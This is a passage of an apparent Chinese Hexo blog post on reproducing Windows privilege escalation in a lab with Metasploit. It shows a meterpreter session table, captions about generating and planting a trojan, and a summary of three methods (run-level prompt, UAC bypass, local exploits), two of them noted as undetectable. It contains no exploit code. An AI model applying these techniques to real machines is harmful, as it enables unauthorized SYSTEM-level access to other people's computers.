class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                   Connection</span><br><span class="line">  --  ----  ----                     -----------                   ----------</span><br><span class="line">  1         meterpreter x86/windows  nan-PC\nan @ NAN-PC           10.200.131.128:4444 -&gt; 10.200.131.26:49178 (10.200.131.26)   # 没有提权</span><br><span class="line">  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ NAN-PC  10.200.131.128:4444 -&gt; 10.200.131.26:49182 (10.200.131.26)	# 使用提高程序运行级别来提权</span><br><span class="line">  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ NAN-PC  10.200.131.128:4444 -&gt; 10.200.131.26:49188 (10.200.131.26)	# UAC绕过的方式提权</span><br><span class="line">  4         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ NAN-PC  10.200.131.128:4444 -&gt; 10.200.131.26:49190 (10.200.131.26)	# 利用本地提权漏洞来进行提权</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>图一：判断目标操作系统</p>
+<p><img src="https://i.loli.net/2021/08/04/ds1AlSGtZEc5zWy.png" alt="image-20210804151559514"></p>
+<p>图二：生成木马</p>
+<p><img src="https://i.loli.net/2021/08/04/tsWhKF9BMNf8Llm.png" alt="image-20210804100219995"></p>
+<p>图三：在目标靶机上下载木马</p>
+<p><img src="https://i.loli.net/2021/08/04/K6UCcaFmhv4QIgq.png" alt="image-20210804101000498"></p>
+<p>图四：使用提高程序运行级别来进行提权是，需要在目标靶机点击<code>是</code>，如果点击的是<code>否</code>，那么就无法获得新的session，所以这个方法需要‘’目标靶机的配合‘’</p>
+<p><img src="https://i.loli.net/2021/08/04/wUT7YfX9byMtjux.png" alt="image-20210804151906556"></p>
+<p><strong>总结</strong>：</p>
+<p>提权的三种思想：</p>
+<ol>
+<li>提高程序的运行级别</li>
+<li>UAC的绕过</li>
+<li>利用本地提权漏洞</li>
+</ol>
+<p>这三种方法都可以实现提权，但是第一种需要“目标靶机的配合”，其他两种在目标靶机没有任何表现，可以做到不被发现。</p>
+<p>前两个的方法和步骤基本就是这样了，但是第三种利用本地提全漏洞就需要我们平时多多积累，可以去百度一些其他的提权模块。</p>
+<p>这些的前提是已经拿到目标靶机的普通权限的基础上，才可以实现。所以在做渗透的时候，还要结合web渗透或者社工的方式拿到普通权限。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/07/21/%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/" rel="prev" title="逆向笔记">
+      <i class="fa fa-chevron-left"></i> 逆向笔记
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">提权复现</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">nan-del</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nan-del</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
